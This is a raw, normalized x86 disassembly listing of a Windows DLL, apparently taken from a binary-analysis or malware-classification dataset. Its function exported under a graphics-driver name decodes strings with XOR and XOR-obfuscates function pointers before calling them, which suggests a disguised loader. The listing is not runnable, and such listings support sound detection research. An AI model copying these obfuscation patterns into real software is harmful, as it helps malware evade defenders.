mov [ ebp - 0x184 ] edx
mov edx [ ebp + 0x28 ]
push eax
mov [ ebp - 0x17c ] ecx
mov [ ebp - 0x180 ] edx
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0x184 ]
mov edx [ esi ]
push ecx
push edx
call edi
test eax eax
je r-xdata
mov ecx [ ebp - 0x178 ]
mov edx [ ecx ]
mov ecx [ ebx ]
push edx
lea esi [ ebp - 0x12c ]
call sub_10056d40
add esp 0x4
mov ecx [ ebp - 0x16c ]
push eax
mov [ ebp - 0x4 ] 0x0
call sub_100649e0
cmp [ ebp - 0x118 ] 0x8
jb r-xdata
mov eax [ ebp - 0x17c ]
mov ecx [ esi ]
push eax
push ecx
call edi
test eax eax
je r-xdata
mov ebx [ ebp - 0x168 ]
mov edi ebx
call sub_100354f0
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x12c ]
push eax
call sub_100187af
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x180 ]
mov ecx [ esi ]
push eax
push ecx
call edi
test eax eax
je r-xdata
mov edi [ ebp - 0x168 ]
call sub_100354f0
test eax eax
jne r-xdata
lea edx [ ebp - 0x110 ]
mov eax 0x1d
call sub_10045930
mov eax edx
lea edx [ eax + 0x2 ]
xor edi edi
lea edx [ ebp - 0x24 ]
mov eax 0x109
mov [ ebp - 0x168 ] edi
call sub_10045930
xor eax eax
mov [ ebp - 0x148 ] ax
mov eax edx
mov [ ebp - 0x134 ] 0x7
mov [ ebp - 0x138 ] edi
lea edx [ eax + 0x2 ]
mov eax [ ebp - 0x178 ]
mov ecx [ eax ]
push ecx
mov ecx [ ebx ]
lea esi [ ebp - 0x164 ]
call sub_10056d40
add esp 0x4
mov ecx [ ebp - 0x16c ]
push eax
mov [ ebp - 0x4 ] 0x7
call sub_100649e0
mov ecx esi
call sub_10019100
mov edi [ ebp - 0x168 ]
call sub_100354f0
test eax eax
jne r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0xb1
call sub_10045930
mov edx [ ebp - 0x16c ]
push edx
lea edx [ ebp - 0xa8 ]
call sub_100453a0
jmp r-xdata
mov [ ebp - 0x168 ] eax
lea edx [ ebp - 0x24 ]
mov eax 0x8c
call sub_10045930
push edx
lea ecx [ ebp - 0x148 ]
call sub_10054d00
push eax
mov eax [ ebp - 0x170 ]
mov [ ebp - 0x4 ] 0x3
mov edx [ eax ]
lea esi [ ebp - 0x12c ]
call sub_1001ccb0
add esp 0x4
mov [ ebp - 0x4 ] 0x4
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp - 0x16c ]
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x110 ]
push edx
call sub_1005ddc0
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x24 ]
push ecx
lea ecx [ ebp - 0x148 ]
call sub_1005ddc0
mov eax [ ebp - 0x170 ]
lea edx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0x1
push edx
mov edx [ eax ]
lea esi [ ebp - 0x12c ]
call sub_1001ccb0
add esp 0x4
mov esi 0x8
mov [ ebp - 0x4 ] 0x2
cmp [ eax + 0x14 ] esi
jb r-xdata
lea edx [ ebp - 0xb8 ]
mov eax 0x12e
call sub_10045930
mov edx [ ebp - 0x16c ]
push edx
lea edx [ ebp - 0xb8 ]
call sub_100453a0
jmp r-xdata
mov [ ebp - 0x168 ] eax
lea edx [ ebp - 0x24 ]
mov eax 0x3c
call sub_10045930
push edx
lea ecx [ ebp - 0x148 ]
call sub_10054d00
push eax
mov eax [ ebp - 0x170 ]
mov [ ebp - 0x4 ] 0x5
mov edx [ eax ]
lea esi [ ebp - 0x12c ]
call sub_1001ccb0
add esp 0x4
mov [ ebp - 0x4 ] 0x6
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov edx [ ebp - 0x174 ]
lea ecx [ ebp - 0x168 ]
push ecx
mov ecx [ edx ]
push ecx
mov ecx eax
mov edx edi
call sub_100594b0
add esp 0x8
test eax eax
lea ecx [ ebp - 0x12c ]
sete bl
call sub_10019100
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10019100
test bl bl
jne r-xdata
mov eax [ eax ]
mov edx [ ebp - 0x174 ]
lea ecx [ ebp - 0x168 ]
push ecx
mov ecx [ edx ]
push ecx
mov ecx eax
mov edx ebx
call sub_100420d0
add esp 0x8
test eax eax
sete bl
cmp [ ebp - 0x118 ] esi
jb r-xdata
mov eax [ eax ]
mov edx [ ebp - 0x174 ]
lea ecx [ ebp - 0x168 ]
push ecx
mov ecx [ edx ]
push ecx
mov ecx eax
mov edx edi
call sub_10019fa0
add esp 0x8
test eax eax
lea ecx [ ebp - 0x12c ]
sete bl
call sub_10019100
lea ecx [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10019100
test bl bl
jne r-xdata
mov eax [ eax ]
mov edx [ ebp - 0x16c ]
push edx
mov edx [ ebp - 0x168 ]
call sub_100453a0
mov eax [ ebp - 0x168 ]
push eax
call [ SysFreeString@IAT ]
jmp r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0xb1
call sub_10045930
mov ecx [ ebp - 0x16c ]
push ecx
call sub_100453a0
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x118 ] 0x7
mov [ ebp - 0x11c ] edi
mov [ ebp - 0x12c ] ax
cmp [ ebp - 0x134 ] esi
jb r-xdata
mov edx [ ebp - 0x12c ]
push edx
call sub_100187af
add esp 0x4
lea edx [ ebp - 0xb8 ]
mov eax 0x12e
call sub_10045930
mov ecx [ ebp - 0x16c ]
push ecx
call sub_100453a0
jmp r-xdata
test bl bl
je r-xdata
mov ecx [ ebp - 0x148 ]
push ecx
call sub_100187af
add esp 0x4
lea edx [ ebp - 0x110 ]
mov eax 0x1d
call sub_10045930
mov ecx [ ebp - 0x16c ]
push ecx
call sub_100453a0
jmp r-xdata
sub_1003dbf0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
cmp esi [ eax + 0x8 ]
je r-xdata
mov edx eax
pop edi
mov [ edx + 0x8 ] esi
pop esi
pop ebp
retn
mov eax r--data
test esi esi
jne r-xdata
push eax
push r--data
call sub_10020200
mov ecx [ edi + 0x8 ]
add esp 0x8
pop edi
mov [ ecx + 0x8 ] esi
pop esi
pop ebp
retn
mov eax r--data
sub_1003dc40
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_10067fd0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1003dc62
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003cbb0
int3
pop ebp
jmp eax
sub_1003dcac
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
mov ebx [ ebp + 0xc ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
push r--data
call sub_1002d84e
test ebx ebx
je r-xdata
push r--data
call sub_1000831a
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_1001eb83
test al al
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx edi
add edx edx
push edx
lea ecx [ ecx + edi * 2 ]
push ecx
lea ecx [ edi + ebx ]
lea eax [ eax + ecx * 2 ]
push eax
call sub_1007ec90
add esp 0xc
push [ ebp + 0x10 ]
mov ecx esi
push ebx
push edi
call sub_10033309
cmp [ esi + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
sub_1003dd58
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004ed97
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_1003de13
push 0x10
push r--data
call sub_1007fb20
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jb r-xdata
call sub_1007fb65
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_10013b34
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10017e58
and [ eax ] 0x0
call sub_1006299d
mov [ eax ] 0x16
jmp r-xdata
call sub_1006299d
mov [ eax ] 0x9
call sub_10017e58
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_10043037
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_100427ff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003df01
mov eax [ ebp - 0x1c ]
sub_1003df09
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10055a33
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
ADL2_Overdrive6_PowerControl_Caps
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008a61b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x588
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x580 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x598 ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x10 ]
lea edx [ esp + 0x34 ]
mov [ esp + 0x10 ] ecx
push edx
mov ecx ebx
mov [ esp + 0x18 ] eax
call sub_100605e0
xor eax eax
mov [ esp + 0x5a0 ] eax
cmp [ esp + 0x70 ] eax
je r-xdata
cmp [ rw-data ] eax
je r-xdata
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov esi [ r--data ]
xor cl cl
call sub_10041cf0
test eax eax
je r-xdata
mov [ rw-data ] eax
mov dl [ esi + eax ]
xor dl cl
xor dl 0x51
inc cl
mov [ esp + eax + 0xd0 ] dl
movzx eax cl
cmp eax 0x21
jb r-xdata
mov esi [ r--data ]
xor cl cl
mov [ esp + 0xf1 ] 0x0
xor eax eax
nop
mov eax [ esp + 0x60 ]
push r--data
xor edi edi
lea ecx [ esp + 0x54 ]
call sub_1001a2f0
lea ebx [ edi + 0x8 ]
test eax eax
je r-xdata
mov esi 0x8
cmp [ esp + 0x64 ] esi
jb r-xdata
mov dl [ esi + eax ]
xor dl cl
xor dl 0x5e
inc cl
mov [ esp + eax + 0xc8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
mov edi 0xf
xor esi esi
mov eax ebx
mov [ esp + 0xce ] 0x0
mov [ esp + 0x2c ] edi
mov [ esp + 0x28 ] esi
mov [ esp + 0x18 ] 0x0
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov eax [ esp + 0x44 ]
push r--data
xor edi edi
lea ecx [ esp + 0x38 ]
call sub_1001a2f0
test eax eax
je r-xdata
mov eax [ esp + 0x50 ]
cmp [ esp + 0x64 ] ebx
jae r-xdata
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] ax
cmp [ esp + 0x48 ] esi
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push ebx
lea ecx [ esp + 0x20 ]
call sub_10037e00
mov [ esp + 0x5a0 ] 0x1
lea eax [ esp + 0xc8 ]
mov [ esp + 0xa4 ] edi
mov [ esp + 0xa0 ] esi
mov [ esp + 0x90 ] 0x0
lea ecx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0xffffffff
push edi
lea edx [ esp + 0x3c ]
push edx
mov ecx rw-data
call sub_100404a0
push eax
call sub_10040e40
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x50 ]
mov ecx [ esp + 0x598 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x580 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esp + 0x34 ]
push ecx
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea eax [ esp + 0xcc ]
push eax
lea ecx [ esp + 0x98 ]
call sub_10037e00
lea ecx [ esp + 0x90 ]
push ecx
lea edx [ esp + 0x78 ]
push r--data
push edx
mov [ esp + 0x5ac ] 0x2
call sub_10057800
add esp 0xc
push eax
mov edx r--data
lea esi [ esp + 0xb0 ]
mov [ esp + 0x5a4 ] 0x3
call sub_10035980
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x5ac ] 0x4
call sub_1005e580
mov ebx 0x10
cmp [ esp + 0xc0 ] ebx
jb r-xdata
cmp [ esp + 0x64 ] ebx
jb r-xdata
mov edi [ GetModuleFileNameW@IAT ]
push 0x104
lea ecx [ esp + 0x180 ]
push ecx
push eax
call edi
test eax eax
je r-xdata
cmp [ esp + 0x64 ] ebx
jb r-xdata
call sub_100187af
add esp 0x4
xor esi esi
mov [ esp + 0xc0 ] edi
mov [ esp + 0xbc ] esi
mov [ esp + 0xac ] 0x0
cmp [ esp + 0x88 ] ebx
jb r-xdata
mov eax [ esp + 0xac ]
push eax
call sub_100187af
add esp 0x4
xor edx edx
cmp [ esp + 0x48 ] ebx
mov [ esp + 0x60 ] 0x0
jmp r-xdata
mov ecx [ esp + 0x50 ]
push ecx
call sub_100187af
add esp 0x4
lea edx [ esp + 0x17c ]
push edx
call [ PathRemoveFileSpecW@IAT ]
lea eax [ esp + 0x17c ]
push eax
call [ PathAddBackslashW@IAT ]
lea ecx [ esp + 0x17c ]
push ecx
call [ SetCurrentDirectoryW@IAT ]
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] edi
mov [ esp + 0x50 ] ax
cmp [ esp + 0x48 ] ebx
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_100187af
add esp 0x4
mov [ esp + 0x5a0 ] 0x1
mov [ esp + 0x88 ] edi
mov [ esp + 0x84 ] esi
mov [ esp + 0x74 ] 0x0
cmp [ esp + 0xa4 ] ebx
jb r-xdata
mov ecx [ esp + 0x74 ]
push ecx
call sub_100187af
add esp 0x4
mov [ esp + 0x50 ] dx
mov [ esp + 0x64 ] 0x7
jb r-xdata
call sub_10013d20
test eax eax
jne r-xdata
mov ecx [ esp + 0x34 ]
push ecx
jmp r-xdata
xor esi esi
xor edi edi
jmp r-xdata
mov edx [ esp + 0x90 ]
push edx
call sub_100187af
add esp 0x4
mov eax [ esp + 0x34 ]
push eax
call sub_10057670
mov ecx rw-data
mov eax rw-data
call sub_1006a4c0
push 0x11b8
call sub_1001f84c
add esp 0x4
test eax eax
je r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0xd0 ]
push eax
lea edx [ edi + ecx ]
push edx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
xor eax eax
mov ecx rw-data
mov esi eax
call sub_10021dc0
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
xor edi edi
cmp ecx edi
je r-xdata
add edi 0x108
inc esi
cmp edi 0x6720
jl r-xdata
call sub_10025120
test al al
je r-xdata
lea edx [ esp + 0xf4 ]
mov eax 0x42
call sub_10045930
push edx
lea ecx [ esp + 0x78 ]
call sub_10054d00
lea edx [ esp + 0x74 ]
mov ecx 0x1
mov [ esp + 0x5a0 ] 0x5
call sub_100205a0
lea ecx [ esp + 0x74 ]
call sub_10019100
jmp r-xdata
mov [ rw-data ] eax
call sub_10039510
call sub_10071020
call sub_10061850
test eax eax
je r-xdata
cmp [ esp + 0x2c ] ebx
jae r-xdata
cmp [ esp + 0x2c ] ebx
jae r-xdata
mov [ esp + 0x5a0 ] 0x0
cmp [ esp + 0x2c ] ebx
jb r-xdata
call sub_10035700
test eax eax
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
mov ecx [ ebp + 0x14 ]
mov edx [ rw-data ]
push ecx
push eax
push edx
jmp r-xdata
lea eax [ esp + 0x18 ]
mov edx [ ebp + 0x14 ]
push edx
push eax
push ecx
lea eax [ esp + 0x18 ]
mov ecx [ esp + 0x18 ]
push ecx
call sub_100187af
add esp 0x4
call sub_10069550
test eax eax
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
mov eax [ esp + 0x20 ]
imul esi esi 0x108
mov ecx [ rw-data ]
mov edx [ esi + ecx + 0x104 ]
push eax
call edx
cmp [ esp + 0x2c ] ebx
jb r-xdata
mov esi 0x8
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] 0xf
cmp [ esp + 0x64 ] esi
jb r-xdata
mov eax [ esp + 0x18 ]
push eax
call sub_100187af
add esp 0x4
call sub_1006f390
push 0x104
lea ecx [ esp + 0x388 ]
push ecx
push 0x0
call edi
test eax eax
je r-xdata
call sub_100141e0
test eax eax
mov eax [ rw-data ]
je r-xdata
xor edx edx
cmp [ esp + 0x48 ] esi
mov [ esp + 0x60 ] edi
mov ecx [ esp + 0x50 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ rw-data ]
push 0x104
lea edx [ esp + 0x180 ]
push edx
push eax
call edi
test eax eax
je r-xdata
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
push ecx
call [ ReleaseMutex@IAT ]
mov edx [ rw-data ]
mov al 0x38
mov [ esp + 0x10 ] edx
xor [ esp + 0x10 ] al
xor [ esp + 0x11 ] al
xor [ esp + 0x12 ] al
xor [ esp + 0x13 ] al
mov eax [ rw-data ]
push eax
call [ esp + 0x14 ]
push eax
call [ ReleaseMutex@IAT ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov al 0x38
mov [ esp + 0x10 ] ecx
xor [ esp + 0x10 ] al
xor [ esp + 0x11 ] al
xor [ esp + 0x12 ] al
xor [ esp + 0x13 ] al
push edx
call [ esp + 0x14 ]
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call sub_1005da40
push rw-data
push rw-data
push eax
mov edx rw-data
mov ebx rw-data
lea esi [ esp + 0x188 ]
lea ecx [ esp + 0x390 ]
call sub_10001380
add esp 0xc
push 0x100
mov [ esp + 0x18 ] eax
call sub_1001f84c
add esp 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0x5a0 ] 0x6
test eax eax
je r-xdata
xor edx edx
cmp [ rw-data ] 0x8
mov ecx [ rw-data ]
jae r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax ecx
sar eax 0x1
je r-xdata
push rw-data
push rw-data
push ecx
mov edx rw-data
mov ecx rw-data
mov edi eax
call sub_100227c0
mov edx eax
jmp r-xdata
mov ecx rw-data
inc edi
add esi 0x208
cmp edi 0x1e
jb r-xdata
mov eax esi
lea ecx [ eax + 0x2 ]
jmp r-xdata
mov [ esp + 0x5a0 ] 0x0
fld [ rw-data ]
push ecx
fstp [ esp ]
mov [ rw-data ] edx
call sub_10058050
fld [ rw-data ]
push ecx
fstp [ esp ]
call sub_1000a850
mov edx [ edx + 0xf4 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
xor edi edi
mov esi rw-data
lea eax [ esi - 0x3e1c ]
lea ecx [ eax + 0x2 ]
call sub_1004d6a0
mov edx [ rw-data ]
mov eax [ edx + 0xf4 ]
push eax
call [ ReleaseMutex@IAT ]
call sub_10043600
push 0x0
push 0x0
push 0x0
push sub_10050690
push 0x0
push 0x0
call sub_1000b29e
mov ecx [ rw-data ]
mov [ esp + 0x28 ] ecx
mov cl 0x38
xor [ esp + 0x28 ] cl
xor [ esp + 0x29 ] cl
xor [ esp + 0x2a ] cl
xor [ esp + 0x2b ] cl
add esp 0x18
push eax
call [ esp + 0x14 ]
mov edx [ esp + 0x14 ]
push edx
lea ecx [ esp + 0x78 ]
call sub_10024810
add esp 0x4
mov [ esp + 0x5a0 ] 0x7
mov eax [ esp + 0x84 ]
test eax eax
je r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
call sub_1002ed80
test eax eax
je r-xdata
cmp [ esp + 0x88 ] 0x10
mov ecx [ esp + 0x74 ]
jae r-xdata
sub eax ecx
sar eax 0x1
je r-xdata
call sub_1000bf50
lea ecx [ esp + 0x74 ]
call sub_1004c8c0
mov ebx 0x8
push 0x0
push eax
mov eax [ rw-data ]
push ecx
push eax
xor edx edx
xor ecx ecx
call sub_1005c3d0
lea ecx [ esp + 0x74 ]
lea ecx [ esi + 0x3cf0 ]
mov eax ecx
lea ebx [ eax + 0x2 ]
lea esp [ esp ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax ebx
sar eax 0x1
je r-xdata
movzx edx [ edi * 2 + rw-data ]
test dx dx
je r-xdata
mov eax [ edi * 4 + rw-data ]
push eax
mov eax [ edi * 4 + rw-data ]
push eax
movzx eax [ edi + rw-data ]
push eax
push ecx
push esi
lea ecx [ esi - 0x7b0c ]
push ecx
lea ecx [ esi - 0x3e1c ]
call sub_1006d0d0
sub_1003e830
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push r--data
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] 0x0
call sub_10020210
lea eax [ ebp - 0x10 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
add esp 0x8
mov [ esi ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx esi
call sub_10037e00
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1003e8a0
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
mov edi eax
cmp esi [ ebp + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
xor ebx ebx
add esi 0x1c
add edi 0x1c
cmp esi [ ebp + 0x8 ]
jne r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp edi esi
je r-xdata
mov eax edi
pop ebx
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] cx
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ edi ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ esi ]
mov [ edi ] ecx
mov [ esi ] ebx
mov edx [ esi + 0x10 ]
lea eax [ edx + edx + 0x2 ]
push eax
push esi
push edi
call sub_1007ec90
add esp 0xc
jmp r-xdata
mov edx [ esi + 0x10 ]
mov [ edi + 0x10 ] edx
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
sub_1003e930
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp + 0xc ]
push esi
cmp eax [ ecx + 0x4 ]
jne r-xdata
xor eax eax
pop esi
pop ebp
retn
mov ecx [ ecx ]
mov esi [ edx ]
cmp eax 0x4
jb r-xdata
test eax eax
je r-xdata
jmp r-xdata
mov eax 0x1
pop esi
pop ebp
retn
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
cmp eax 0x1
jbe r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
sub_1003e9a0
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] ecx
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x30 ] edx
mov edx [ ebp + 0x18 ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] edx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] 0x1
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x10d
call sub_10053240
mov eax edi
cmp eax edi
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xa9
call sub_10053240
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
add eax eax
mov [ ebp - 0x38 ] eax
add eax 0x2
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x38 ]
push ecx
push ebx
push eax
mov [ esi + 0x4 ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] edi
lea edx [ ebp - 0x28 ]
mov eax 0xd3
call sub_10053240
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x34 ]
push ebx
push ecx
push eax
mov [ esi + 0x8 ] eax
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x134
call sub_10053240
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
